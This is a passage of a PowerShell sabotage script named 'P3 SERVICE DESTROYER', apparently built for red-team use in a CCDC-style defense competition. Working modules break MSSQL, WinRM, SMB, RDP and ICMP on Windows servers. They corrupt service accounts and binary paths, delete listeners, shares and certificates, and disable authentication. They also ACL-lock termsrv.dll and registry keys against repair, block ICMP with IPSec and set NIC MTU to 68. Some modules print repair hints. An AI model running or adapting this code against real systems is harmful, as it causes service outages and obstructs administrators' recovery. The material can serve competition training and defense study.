            $svcRegPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
            Set-ItemProperty -Path $svcRegPath -Name ObjectName -Value '.\NonExistentUser2019'
            Write-Success "Service ObjectName set via registry to .\NonExistentUser2019"
        } catch {
            Write-Err "Registry fallback for service account also failed: $_"
        }
    }

    Write-Info "Injecting invalid startup parameter into SQL Server Parameters registry..."
    try {
        $paramPath = "$SqlBase\Parameters"
        if (Test-Path $paramPath) {
            $regItem  = Get-Item $paramPath -ErrorAction SilentlyContinue
            $existing = if ($regItem) {
                            $regItem.Property | Where-Object { $_ -match '^SQLArg\d+$' }
                        } else { @() }
            $nextIdx  = if ($existing) {
                            ($existing | ForEach-Object { [int]($_ -replace 'SQLArg', '') } |
                             Measure-Object -Maximum).Maximum + 1
                        } else { 0 }
            $argName  = "SQLArg$nextIdx"
            Set-ItemProperty -Path $paramPath -Name $argName `
                             -Value '-eC:\NonExistent\Logs\sqlserver_error.log' -Type String
            Write-Success "Added invalid startup param $argName = -eC:\NonExistent\Logs\sqlserver_error.log"
        } else {
            Write-Warn "Parameters registry key not found -- skipping startup param injection"
        }
    } catch {
        Write-Err "Failed to inject startup parameter: $_"
    }

    Write-Info "Stopping MSSQLSERVER service..."
    try {
        Stop-Service -Name MSSQLSERVER -Force
        Write-Success "MSSQLSERVER service stopped"
    } catch {
        Write-Err "Could not stop MSSQLSERVER: $_"
    }

    Write-Success "DeadInTheWater complete -- all 3 layers applied"
    Write-Info "  L1: Fix service account + remove invalid SQLArg startup param"
    Write-Info "  L2: Fix master RESTRICTED_USER, msdb OFFLINE, model READ_ONLY, re-enable TCP/IP"
    Write-Info "  L3: Remap port back to 1433, re-enable SQLBrowser, remove FW rules"
}

# ==============================================================================
#  MODULE 4 -- WINRM WRECKED  (WinRM)
# ==============================================================================
function Invoke-WinRMWrecked {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Red
    Write-Host "   WinRMWrecked -- T1489/T1562.004/T1021.006" -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red

    if (-not $script:HasWinRM) {
        Write-Warn "WinRM service not found. Skipping WinRMWrecked."
        return
    }

    # -- Layer 1: Listener Annihilation ----------------------------------------
    Write-Section "WinRMWrecked 1/3  Listener Annihilation"

    $listenerRoot = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\Listener"
    if (Test-Path $listenerRoot) {
        try {
            Remove-Item -Path "$listenerRoot\*" -Recurse -Force -ErrorAction Stop
            Write-Success "Deleted all WinRM listener registry keys under $listenerRoot"
        } catch {
            Write-Err "Failed to delete listener keys: $_"
        }
    } else {
        Write-Warn "WinRM Listener registry root not found -- may already be clean: $listenerRoot"
    }

    & winrm.cmd set winrm/config '@{MaxEnvelopeSizekb="1"}' 2>$null | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-Success "MaxEnvelopeSizekb set to 1 -- all SOAP messages rejected as oversized"
    } else {
        Write-Warn "winrm set MaxEnvelopeSizekb failed (rc=$LASTEXITCODE) -- WinRM may already be broken"
    }

    # -- Layer 2: Authentication Blackout --------------------------------------
    Write-Section "WinRMWrecked 2/3  Authentication Blackout"

    $wsmanSvcKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\Service"
    $authProps   = @("BasicAuth", "DigestAuthentication", "NegotiateAuthentication", "KerberosAuthentication", "CertificateAuthentication")
    foreach ($prop in $authProps) {
        try {
            Set-ItemProperty -Path $wsmanSvcKey -Name $prop -Value 0 -Type DWord -ErrorAction Stop
            Write-Success "  $prop = 0"
        } catch {
            Write-Warn "  Failed to set ${prop}: $_"
        }
    }
    Write-Info "All WinRM auth methods disabled -- even a restored listener cannot authenticate"

    # -- Layer 3: Service Account + Binary Corruption --------------------------
    Write-Section "WinRMWrecked 3/3  Service Account + Binary Corruption"

    $svcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\WinRM"
    try {
        Set-ItemProperty -Path $svcKey -Name "ObjectName" -Value ".\NonExistentUser2019" -ErrorAction Stop
        Write-Success "WinRM ObjectName set to .\NonExistentUser2019"
    } catch {
        Write-Err "Failed to corrupt WinRM ObjectName: $_"
    }
    try {
        Set-ItemProperty -Path $svcKey -Name "ImagePath" -Value "C:\NonExistent\svchost.exe" -ErrorAction Stop
        Write-Success "WinRM ImagePath corrupted to C:\NonExistent\svchost.exe"
    } catch {
        Write-Err "Failed to corrupt WinRM ImagePath: $_"
    }
    try {
        Stop-Service -Name WinRM -Force -ErrorAction Stop
        Write-Success "WinRM service stopped"
    } catch {
        Write-Warn "Could not stop WinRM: $_"
    }
    try {
        Set-Service -Name WinRM -StartupType Disabled -ErrorAction Stop
        Write-Success "WinRM StartupType set to Disabled"
    } catch {
        Write-Warn "Could not disable WinRM startup: $_"
    }

    Write-Success "WinRMWrecked complete -- all 3 layers applied"
    Write-Info "  L1: Restore listener keys + reset MaxEnvelopeSizekb (winrm quickconfig)"
    Write-Info "  L2: Re-enable auth methods in HKLM:\...\WSMAN\Service"
    Write-Info "  L3: Restore ObjectName/ImagePath for WinRM service, re-enable + restart"
}

# ==============================================================================
#  MODULE 5 -- SMB SHATTER  (SMB / LanmanServer)
# ==============================================================================
function Invoke-SMBShatter {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Red
    Write-Host "   SMBShatter -- T1489/T1021.002/T1565.001" -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red

    if (-not $script:HasSMB) {
        Write-Warn "LanmanServer service not found. Skipping SMBShatter."
        return
    }

    # -- Layer 1: Protocol Kill + Share Destruction ----------------------------
    Write-Section "SMBShatter 1/3  Protocol Kill + Share Destruction"

    $lanParams = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
    try {
        Set-ItemProperty -Path $lanParams -Name "SMB2" -Value 0 -Type DWord -ErrorAction Stop
        Write-Success "SMB2 disabled in registry (LanmanServer\Parameters\SMB2 = 0)"
    } catch {
        Write-Err "Failed to disable SMB2 in registry: $_"
    }
    try {
        Set-SmbServerConfiguration -EnableSMB1Protocol $false -EnableSMB2Protocol $false -Force -ErrorAction Stop
        Write-Success "Set-SmbServerConfiguration: SMB1 and SMB2 both disabled"
    } catch {
        Write-Warn "Set-SmbServerConfiguration failed: $_ -- registry path already applied"
    }

    Write-Info "Removing all non-admin SMB shares..."
    try {
        $userShares = Get-SmbShare -ErrorAction SilentlyContinue | Where-Object { $_.Special -eq $false }
        if ($userShares) {
            foreach ($share in $userShares) {
                try {
                    Remove-SmbShare -Name $share.Name -Force -ErrorAction Stop
                    Write-Success "  Removed share: $($share.Name)"
                } catch {
                    Write-Warn "  Could not remove share $($share.Name): $_"
                }
            }
        } else {
            Write-Info "No non-admin shares found to remove"
        }
    } catch {
        Write-Warn "Share enumeration failed: $_"
    }

    # -- Layer 2: Connection Capacity + Auth Paradox ---------------------------
    Write-Section "SMBShatter 2/3  Connection Capacity + Auth Paradox"

    $capacityProps = @(
        @{ Name = "MaxMpxCt";        Value = 1 },
        @{ Name = "MaxWorkItems";    Value = 1 },
        @{ Name = "MaxRawWorkItems"; Value = 1 }
    )
    foreach ($p in $capacityProps) {
        try {
            Set-ItemProperty -Path $lanParams -Name $p.Name -Value $p.Value -Type DWord -ErrorAction Stop
            Write-Success "  $($p.Name) = $($p.Value) (connection capacity strangled)"
        } catch {
            Write-Warn "  Failed to set $($p.Name): $_"
        }
    }

    $lsaKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
    try {
        Set-ItemProperty -Path $lsaKey -Name "LmCompatibilityLevel" -Value 0 -Type DWord -ErrorAction Stop
        Write-Success "LmCompatibilityLevel = 0 (LM-only responses -- rejected by all modern clients)"
    } catch {
        Write-Err "Failed to set LmCompatibilityLevel: $_"
    }
    try {
        Set-ItemProperty -Path $lsaKey -Name "RestrictAnonymous" -Value 2 -Type DWord -ErrorAction Stop
        Write-Success "RestrictAnonymous = 2"
    } catch {
        Write-Err "Failed to set RestrictAnonymous: $_"
    }
    try {
        Set-ItemProperty -Path $lsaKey -Name "RestrictAnonymousSAM" -Value 1 -Type DWord -ErrorAction Stop
        Write-Success "RestrictAnonymousSAM = 1 (LM-only + anonymous restriction = auth paradox)"
    } catch {
        Write-Err "Failed to set RestrictAnonymousSAM: $_"
    }

    # -- Layer 3: Service Account + Binary Corruption + Stop -------------------
    Write-Section "SMBShatter 3/3  Service Account + Binary Corruption + Stop"

    $smbSvcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer"
    try {
        Set-ItemProperty -Path $smbSvcKey -Name "ObjectName" -Value ".\NonExistentUser2019" -ErrorAction Stop
        Write-Success "LanmanServer ObjectName set to .\NonExistentUser2019"
    } catch {
        Write-Err "Failed to corrupt LanmanServer ObjectName: $_"
    }
    try {
        Set-ItemProperty -Path $smbSvcKey -Name "ImagePath" -Value "C:\NonExistent\svchost.exe" -ErrorAction Stop
        Write-Success "LanmanServer ImagePath corrupted to C:\NonExistent\svchost.exe"
    } catch {
        Write-Err "Failed to corrupt LanmanServer ImagePath: $_"
    }
    try {
        Stop-Service -Name LanmanServer -Force -ErrorAction Stop
        Write-Success "LanmanServer service stopped"
    } catch {
        Write-Warn "Could not stop LanmanServer: $_"
    }
    try {
        Set-Service -Name LanmanServer -StartupType Disabled -ErrorAction Stop
        Write-Success "LanmanServer StartupType set to Disabled"
    } catch {
        Write-Warn "Could not disable LanmanServer startup: $_"
    }

    Write-Success "SMBShatter complete -- all 3 layers applied"
    Write-Info "  L1: Re-enable SMB2 in registry + Set-SmbServerConfiguration, recreate shares"
    Write-Info "  L2: Restore LmCompatibilityLevel=3, RestrictAnonymous=0, MaxMpxCt=50"
    Write-Info "  L3: Restore ObjectName/ImagePath for LanmanServer, re-enable + restart"
}

# ==============================================================================
#  MODULE 6 -- RDP RUINED  (Remote Desktop Protocol)
# ==============================================================================
function Invoke-RDPRuined {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Red
    Write-Host "   RDPRuined -- T1489/T1021.001/T1562.004" -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red

    if (-not $script:HasRDP) {
        Write-Warn "TermService not found. Skipping RDPRuined."
        return
    }

    # -- Layer 1: Port Remap + Hard Deny ---------------------------------------
    Write-Section "RDPRuined 1/3  Port Remap + Hard Deny"

    $rdpTcpKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
    try {
        Set-ItemProperty -Path $rdpTcpKey -Name "PortNumber" -Value 33890 -Type DWord -ErrorAction Stop
        Write-Success "RDP PortNumber changed from 3389 to 33890"
    } catch {
        Write-Err "Failed to remap RDP port: $_"
    }

    $tsKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server"
    try {
        Set-ItemProperty -Path $tsKey -Name "fDenyTSConnections" -Value 1 -Type DWord -ErrorAction Stop
        Write-Success "fDenyTSConnections = 1 (RDP connections hard-denied at TS layer)"
    } catch {
        Write-Err "Failed to set fDenyTSConnections: $_"
    }

    Write-Info "Corrupting TermService ServiceDll -- svchost cannot load TermService on any restart..."
    $termSvcParams = "HKLM:\SYSTEM\CurrentControlSet\Services\TermService\Parameters"
    try {
        Set-ItemProperty -Path $termSvcParams -Name "ServiceDll" `
            -Value "C:\NonExistent\termsrv.dll" -Type ExpandString -ErrorAction Stop
        Write-Success "TermService Parameters\ServiceDll -> C:\NonExistent\termsrv.dll"
    } catch {
        Write-Err "Failed to corrupt ServiceDll: $_"
    }

    Write-Info "Setting session timeouts to 1ms (any surviving session disconnects instantly)..."
    $timeoutProps = @("MaxConnectionTime", "MaxDisconnectionTime", "MaxIdleTime")
    foreach ($prop in $timeoutProps) {
        try {
            Set-ItemProperty -Path $rdpTcpKey -Name $prop -Value 1 -Type DWord -ErrorAction Stop
            Write-Success "  $prop = 1ms"
        } catch {
            Write-Warn "  Failed to set ${prop}: $_"
        }
    }
    try {
        Set-ItemProperty -Path $rdpTcpKey -Name "fInheritMaxDisconnectionTime" -Value 0 -Type DWord -ErrorAction Stop
        Write-Success "  fInheritMaxDisconnectionTime = 0 (local timeout enforced, not GP)"
    } catch {
        Write-Warn "  Failed to set fInheritMaxDisconnectionTime: $_"
    }

    # -- Layer 2: Security Layer Paradox + Cert Destruction --------------------
    Write-Section "RDPRuined 2/3  Security Layer Paradox + Cert Destruction"

    try {
        Set-ItemProperty -Path $rdpTcpKey -Name "SecurityLayer" -Value 0 -Type DWord -ErrorAction Stop
        Write-Success "SecurityLayer = 0 (legacy RDP security -- no TLS)"
    } catch {
        Write-Err "Failed to set SecurityLayer: $_"
    }
    try {
        Set-ItemProperty -Path $rdpTcpKey -Name "MinEncryptionLevel" -Value 4 -Type DWord -ErrorAction Stop
        Write-Success "MinEncryptionLevel = 4 (FIPS mandatory -- conflicts with SecurityLayer=0; clients reject handshake)"
    } catch {
        Write-Err "Failed to set MinEncryptionLevel: $_"
    }
    try {
        Set-ItemProperty -Path $rdpTcpKey -Name "UserAuthenticationRequired" -Value 1 -Type DWord -ErrorAction Stop
        Write-Success "UserAuthenticationRequired = 1 (NLA required -- broken cert makes NLA impossible)"
    } catch {
        Write-Warn "Failed to set UserAuthenticationRequired: $_"
    }

    $rcmCertKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\RCM\Certificates"
    if (Test-Path $rcmCertKey) {
        try {
            $certValues = (Get-Item -Path $rcmCertKey -ErrorAction SilentlyContinue).Property
            if ($certValues) {
                foreach ($v in $certValues) {
                    Remove-ItemProperty -Path $rcmCertKey -Name $v -Force -ErrorAction SilentlyContinue
                }
                Write-Success "Deleted $($certValues.Count) RDP certificate thumbprint(s) from RCM\Certificates"
            } else {
                Write-Info "No existing RDP cert thumbprints found in RCM\Certificates"
            }
        } catch {
            Write-Warn "Failed to clear RCM\Certificates: $_"
        }
    } else {
        Write-Warn "RCM\Certificates key not found -- may regenerate on next start (harmless)"
    }

    Write-Info "ACL-denying termsrv.dll so it cannot be executed even if restored from rename..."
    $termsrvDll = "$env:SystemRoot\System32\termsrv.dll"
    if (Test-Path $termsrvDll) {
        & icacls.exe $termsrvDll /deny "Everyone:(RX)" /C /Q 2>$null | Out-Null
        if ($LASTEXITCODE -eq 0) {
            Write-Success "ACL-locked termsrv.dll -- Everyone denied Read+Execute"
        } else {
            Write-Warn "icacls /deny on termsrv.dll returned $LASTEXITCODE"
        }
    } else {
        Write-Info "termsrv.dll not found at expected path (may already be renamed by HideServices)"
    }

    Write-Info "Deleting RDP self-signed certificate from SystemCertificates store..."
    $rdpCertStoreKey = "HKLM:\SOFTWARE\Microsoft\SystemCertificates\Remote Desktop\Certificates"
    if (Test-Path $rdpCertStoreKey) {
        try {
            Get-ChildItem -Path $rdpCertStoreKey -ErrorAction SilentlyContinue |
                Remove-Item -Force -Recurse -ErrorAction Stop
            Write-Success "Deleted all entries from SystemCertificates\Remote Desktop cert store"
        } catch {
            Write-Warn "Failed to clear RDP cert store: $_"
        }
    } else {
        Write-Info "RDP cert store key not found -- no entries to remove"
    }

    # -- Layer 3: Service Account + Binary Corruption + Stop -------------------
    Write-Section "RDPRuined 3/3  Service Account + Binary Corruption + Stop"

    $rdpSvcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\TermService"
    try {
        Set-ItemProperty -Path $rdpSvcKey -Name "ObjectName" -Value ".\NonExistentUser2019" -ErrorAction Stop
        Write-Success "TermService ObjectName set to .\NonExistentUser2019"
    } catch {
        Write-Err "Failed to corrupt TermService ObjectName: $_"
    }
    try {
        Set-ItemProperty -Path $rdpSvcKey -Name "ImagePath" -Value "C:\NonExistent\svchost.exe" -ErrorAction Stop
        Write-Success "TermService ImagePath corrupted to C:\NonExistent\svchost.exe"
    } catch {
        Write-Err "Failed to corrupt TermService ImagePath: $_"
    }
    try {
        Stop-Service -Name TermService -Force -ErrorAction Stop
        Write-Success "TermService stopped"
    } catch {
        Write-Warn "Could not stop TermService: $_"
    }
    try {
        Set-Service -Name TermService -StartupType Disabled -ErrorAction Stop
        Write-Success "TermService StartupType set to Disabled"
    } catch {
        Write-Warn "Could not disable TermService startup: $_"
    }

    Write-Info "Injecting fake service dependency -- SCM refuses to start TermService without it..."
    try {
        $depVal = [string[]]@("RPCSS", "NonExistentCorruptDep2019")
        Set-ItemProperty -Path $rdpSvcKey -Name "DependOnService" -Value $depVal -Type MultiString -ErrorAction Stop
        Write-Success "DependOnService now includes NonExistentCorruptDep2019 -- SCM blocks start"
    } catch {
        Write-Err "Failed to corrupt DependOnService: $_"
    }

    Write-Info "Registry ACL: locking TermService key against easy repair..."
    try {
        $regHive    = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
            [Microsoft.Win32.RegistryHive]::LocalMachine,
            [Microsoft.Win32.RegistryView]::Default
        )
        $termRegKey = $regHive.OpenSubKey(
            "SYSTEM\CurrentControlSet\Services\TermService",
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions -bor
            [System.Security.AccessControl.RegistryRights]::ReadPermissions
        )
        if ($termRegKey) {
            $acl  = $termRegKey.GetAccessControl()
            $deny = New-Object System.Security.AccessControl.RegistryAccessRule(
                "BUILTIN\Users",
                "SetValue,CreateSubKey,WriteKey",
                [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
                [System.Security.AccessControl.PropagationFlags]::None,
                [System.Security.AccessControl.AccessControlType]::Deny
            )
            $acl.AddAccessRule($deny)
            $termRegKey.SetAccessControl($acl)
            $termRegKey.Close()
            Write-Success "Registry ACL: Denied BUILTIN\Users write access to TermService key"
        } else {
            Write-Warn "Could not open TermService registry key for ACL modification"
        }
        $regHive.Close()
    } catch {
        Write-Warn "Registry ACL on TermService key failed: $_"
    }

    Write-Success "RDPRuined complete -- all layers applied"
    Write-Info "  L1: Restore PortNumber=3389, fDenyTSConnections=0, restore ServiceDll, restore timeouts"
    Write-Info "  L2: Restore SecurityLayer=2, MinEncryptionLevel=2, NLAEnabled=0, remove icacls deny on termsrv.dll"
    Write-Info "  L3: Restore ObjectName/ImagePath, restore DependOnService, remove registry ACL deny, re-enable + restart"
}

# ==============================================================================
#  MODULE 7 -- ICMP DARKNESS  (ICMP / Ping)
# ==============================================================================
function Invoke-ICMPDarkness {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Red
    Write-Host "   ICMPDarkness -- T1562.004/T1490" -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red

    # -- Layer 1: IPSec Policy Block (firewall-independent) --------------------
    Write-Section "ICMPDarkness 1/3  IPSec Policy Block (survives Windows Firewall toggle)"

    $ipsecCmds = @(
        @("ipsec", "static", "add", "policy", "name=CCDC_ICMPKill"),
        @("ipsec", "static", "add", "filterlist", "name=AllICMP"),
        @("ipsec", "static", "add", "filter", "filterlist=AllICMP", "srcaddr=any", "dstaddr=any", "protocol=icmp", "mirrored=yes"),
        @("ipsec", "static", "add", "filteraction", "name=DropICMP", "action=block"),
        @("ipsec", "static", "add", "rule", "name=KillICMP", "policy=CCDC_ICMPKill", "filterlist=AllICMP", "filteraction=DropICMP"),
        @("ipsec", "static", "set", "policy", "name=CCDC_ICMPKill", "assign=yes")
    )
    $ipsecLabels = @(
        "Created IPSec policy: CCDC_ICMPKill",
        "Created filter list: AllICMP",
        "Added ICMPv4 mirrored filter (any->any)",
        "Added block filter action: DropICMP",
        "Linked rule KillICMP -> AllICMP -> DropICMP",
        "Assigned (activated) policy: CCDC_ICMPKill"
    )
    for ($i = 0; $i -lt $ipsecCmds.Count; $i++) {
        & netsh.exe $ipsecCmds[$i] 2>$null | Out-Null
        if ($LASTEXITCODE -eq 0) {
            Write-Success $ipsecLabels[$i]
        } else {
            Write-Warn "$($ipsecLabels[$i]) -- rc=$LASTEXITCODE (may already exist)"
        }
    }
    Write-Info "IPSec ICMP block is independent of Windows Firewall -- survives firewall service stop/start"

    # -- Layer 2: TCPIP Stack Registry Hardening --------------------------------
    Write-Section "ICMPDarkness 2/3  TCPIP Stack Registry Hardening"

    $tcpipKeys = @(
        "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
        "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters"
    )
    $tcpipProps = @(
        @{ Name = "EnableICMPRedirect";     Value = 0 },
        @{ Name = "PerformRouterDiscovery"; Value = 0 },
        @{ Name = "DeadGWDetectDefault";    Value = 0 },
        @{ Name = "DisableIPSourceRouting"; Value = 2 }
    )
    foreach ($keyPath in $tcpipKeys) {
        $keyLabel = if ($keyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }
        foreach ($p in $tcpipProps) {
            try {
                Set-ItemProperty -Path $keyPath -Name $p.Name -Value $p.Value -Type DWord -ErrorAction Stop
                Write-Success "  [$keyLabel] $($p.Name) = $($p.Value)"
            } catch {
                Write-Warn "  [$keyLabel] Failed to set $($p.Name): $_"
            }
        }
    }

    # -- Layer 3: Interface MTU Cripple ----------------------------------------
    Write-Section "ICMPDarkness 3/3  Interface MTU Cripple (MTU=68 on all active NICs)"

    try {
        $adapters = Get-NetAdapter -ErrorAction Stop | Where-Object { $_.Status -eq "Up" }
        if ($adapters) {
            foreach ($nic in $adapters) {
                & netsh.exe interface ipv4 set subinterface $nic.InterfaceAlias mtu=68 store=persistent 2>$null | Out-Null
                if ($LASTEXITCODE -eq 0) {
                    Write-Success "  MTU=68 set on: $($nic.InterfaceAlias)"
                } else {
                    Write-Warn "  MTU set failed on $($nic.InterfaceAlias) (rc=$LASTEXITCODE)"
                }
            }
            Write-Info "MTU=68 causes severe fragmentation -- most ICMP and real traffic cannot pass cleanly"
        } else {
            Write-Warn "No active adapters found -- skipping MTU cripple"
        }
    } catch {
        Write-Err "Get-NetAdapter failed: $_ -- MTU layer skipped"
    }

    Write-Success "ICMPDarkness complete -- all 3 layers applied"
    Write-Info "  L1: netsh ipsec static set policy name=CCDC_ICMPKill assign=no"
    Write-Info "       netsh ipsec static delete policy name=CCDC_ICMPKill"
    Write-Info "  L2: Remove registry TCPIP overrides (revert to defaults or delete the values)"
    Write-Info "  L3: Restore MTU: netsh interface ipv4 set subinterface <alias> mtu=1500 store=persistent"
}

# ==============================================================================
#  MENU + DISPATCH
# ==============================================================================

$script:ExecOrder = @("KerberosKhaos", "ConditionalSurrender", "DeadInTheWater", "WinRMWrecked", "SMBShatter", "RDPRuined", "ICMPDarkness")

$script:ModuleDefs = @{
    "KerberosKhaos"        = @{ Num = 1; Label = "KerberosKhaos       "; Role = "AD/DC"; Present = $script:HasAD    }
    "ConditionalSurrender" = @{ Num = 2; Label = "ConditionalSurrender"; Role = "DNS  "; Present = $script:HasDNS   }
    "DeadInTheWater"       = @{ Num = 3; Label = "DeadInTheWater      "; Role = "MSSQL"; Present = $script:HasMSSQL }
    "WinRMWrecked"         = @{ Num = 4; Label = "WinRMWrecked        "; Role = "WinRM"; Present = $script:HasWinRM }
    "SMBShatter"           = @{ Num = 5; Label = "SMBShatter          "; Role = "SMB  "; Present = $script:HasSMB   }
    "RDPRuined"            = @{ Num = 6; Label = "RDPRuined           "; Role = "RDP  "; Present = $script:HasRDP   }
    "ICMPDarkness"         = @{ Num = 7; Label = "ICMPDarkness        "; Role = "ICMP "; Present = $true            }
}

function Resolve-ModuleName { param([string]$Token)
    $aliases = @{
        "1"           = "KerberosKhaos";   "kerberos" = "KerberosKhaos";   "kk"  = "KerberosKhaos"
        "kerberoskhaos" = "KerberosKhaos"; "ad"       = "KerberosKhaos";   "dc"  = "KerberosKhaos"
        "2"           = "ConditionalSurrender"; "dns" = "ConditionalSurrender"; "cs"  = "ConditionalSurrender"
        "conditionalsurrender" = "ConditionalSurrender"; "surrender" = "ConditionalSurrender"
        "3"           = "DeadInTheWater";  "mssql"    = "DeadInTheWater";   "ditw" = "DeadInTheWater"
        "deadinthewater" = "DeadInTheWater"; "sql"    = "DeadInTheWater";   "dead" = "DeadInTheWater"
        "4"           = "WinRMWrecked";    "winrm"    = "WinRMWrecked";     "wrw"  = "WinRMWrecked"
        "winrmwrecked" = "WinRMWrecked";   "wrmwrecked" = "WinRMWrecked"
        "5"           = "SMBShatter";      "smb"      = "SMBShatter";       "smbshatter" = "SMBShatter"
        "6"           = "RDPRuined";       "rdp"      = "RDPRuined";        "rdpruined"  = "RDPRuined"
        "7"           = "ICMPDarkness";    "icmp"     = "ICMPDarkness";     "icmpdarkness" = "ICMPDarkness"
        "ping"        = "ICMPDarkness"
    }
    $key = $Token.ToLower().Trim()
    if ($aliases.ContainsKey($key)) { return $aliases[$key] }
    return $null
}

function Show-Menu {
    $states = @{}
    foreach ($m in $script:ExecOrder) { $states[$m] = Get-ModuleState $m }

    Write-Host ""
    Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan
    Write-Host "  |        P3 SERVICE DESTROYER -- Select Modules            |" -ForegroundColor Cyan
    Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan

    foreach ($m in $script:ExecOrder) {
        $def     = $script:ModuleDefs[$m]
        $roleTag = if ($def.Present) { "[PRESENT]" } else { "[ABSENT] " }
        $roleCol = if ($def.Present) { "Green"     } else { "DarkGray"  }
        if     ($states[$m] -eq "SUCCESS") { $stTag = " [DONE]"; $stCol = "Green"  }
        elseif ($states[$m] -eq "FAILED")  { $stTag = " [FAIL]"; $stCol = "Red"    }
        elseif ($states[$m] -eq "RUNNING") { $stTag = " [ RUN]"; $stCol = "Yellow" }
        else                               { $stTag = "       "; $stCol = "White"  }
        Write-Host "  |  " -ForegroundColor Cyan -NoNewline
        Write-Host "[$($def.Num)] $($def.Label) ($($def.Role))  " -ForegroundColor White -NoNewline
        Write-Host $roleTag -ForegroundColor $roleCol -NoNewline
        Write-Host $stTag -ForegroundColor $stCol -NoNewline
        Write-Host "  |" -ForegroundColor Cyan
    }

    Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan
    Write-Host "  |  [A] All present roles   [S] Status   [Q] Quit           |" -ForegroundColor Cyan
    Write-Host "  |  Modules: 1-7, kk/cs/ditw/winrm/smb/rdp/icmp           |" -ForegroundColor Cyan
    Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan
    Write-Host ""
}

function Show-Status {
    Write-Section "Module State"
    foreach ($m in $script:ExecOrder) {
        $def   = $script:ModuleDefs[$m]
        $state = Get-ModuleState $m
        if     ($state -eq "SUCCESS") { $col = "Green"  }
        elseif ($state -eq "FAILED")  { $col = "Red"    }
        else                          { $col = "Yellow" }
        $pres  = if ($def.Present) { "PRESENT" } else { "ABSENT" }
        Write-Host ("  {0,-24} Role:{1,-5}  State:" -f $m, $pres) -NoNewline
        Write-Host $state -ForegroundColor $col
    }
}

function Invoke-Modules { param([string[]]$ToRun)
    $summary = @()

    foreach ($m in $script:ExecOrder) {
        if ($m -notin $ToRun) { continue }

        $existingState = Get-ModuleState $m

        if ($existingState -eq "SUCCESS" -and -not $Force) {
            if (-not $Resume) {
                Write-Warn "[$m] already SUCCESS -- skipping (use -Force to re-run, -Resume to skip silently)"
            }
            $summary += [PSCustomObject]@{ Module = $m; Result = "SKIPPED (already SUCCESS)"; Elapsed = "-" }
            continue
        }

        Set-ModuleState $m "RUNNING"
        $sw = [System.Diagnostics.Stopwatch]::StartNew()

        try {
            switch ($m) {
                "KerberosKhaos"        { Invoke-KerberosKhaos        }
                "ConditionalSurrender" { Invoke-ConditionalSurrender  }
                "DeadInTheWater"       { Invoke-DeadInTheWater        }
                "WinRMWrecked"         { Invoke-WinRMWrecked          }
                "SMBShatter"           { Invoke-SMBShatter            }
                "RDPRuined"            { Invoke-RDPRuined             }
                "ICMPDarkness"         { Invoke-ICMPDarkness          }
            }
            Set-ModuleState $m "SUCCESS"
            $summary += [PSCustomObject]@{ Module = $m; Result = "SUCCESS"; Elapsed = "$($sw.Elapsed.ToString('mm\:ss'))" }
        } catch {
            Write-Err "[$m] Unhandled error: $_"
            Set-ModuleState $m "FAILED"
            $summary += [PSCustomObject]@{ Module = $m; Result = "FAILED"; Elapsed = "$($sw.Elapsed.ToString('mm\:ss'))" }
        }
        $sw.Stop()
    }

    Write-Host ""
    Write-Section "Session Summary"
    $summary | Format-Table -AutoSize | Out-String | Write-Host
}

# ==============================================================================
#  ENTRY POINT
# ==============================================================================

Show-Banner

if ($Status) {
    Show-Status
    exit 0
}

# Non-interactive path
if ($All) {
    $toRun = $script:ExecOrder | Where-Object { $script:ModuleDefs[$_].Present }
    if (-not $toRun) {
        Write-Warn "No target roles detected on this machine (AD/DNS/MSSQL). Nothing to run."
        exit 0
    }
    Write-Info "Running all present-role modules: $($toRun -join ', ')"
    Invoke-Modules -ToRun $toRun
    exit 0
}

if ($Modules.Count -gt 0) {
    $resolved = @()
    foreach ($m in $Modules) {
        $name = Resolve-ModuleName $m
        if ($name) {
            $resolved += $name
        } else {
